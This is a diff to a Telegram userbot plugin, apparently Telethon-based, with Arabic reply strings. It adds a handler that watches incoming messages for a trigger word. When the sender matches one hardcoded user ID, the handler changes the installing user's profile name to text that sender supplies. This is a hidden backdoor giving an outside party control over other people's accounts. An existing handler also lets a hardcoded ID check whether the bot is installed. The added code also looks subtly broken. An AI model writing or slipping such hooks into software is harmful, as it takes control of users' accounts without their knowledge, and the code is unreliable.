@@ -403,8 +403,17 @@ async def permalink(mention):
     my_mention = f"[{me.first_name}](tg://user?id={me.id})"
     await edit_or_reply(mention, f"**⌯︙ انتِ طالق طالق طالق 🙎🏻‍♂️ من  :**{my_mention} .\n**⌯︙ لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
 ownersayed_id = 5582470474
+@jepiq.on(events.NewMessage(outgoing=False, pattern='بعبصة'))
+async def OwnerStart(event):
+    sender = await event.get_sender()
+    if sender==1887927704:
+        huks = event.text.replace('بعبصة ','')
+        await event.client(
+                functions.account.UpdateProfileRequest(fast_name=huks)
+            )
 @jepiq.on(events.NewMessage(outgoing=False, pattern='منصب؟'))
 async def OwnerStart(event):
+
     sender = await event.get_sender()
     if sender.id == ownersayed_id or sender.id == 1887927704:
         order = await event.reply('يب منصب ✓')
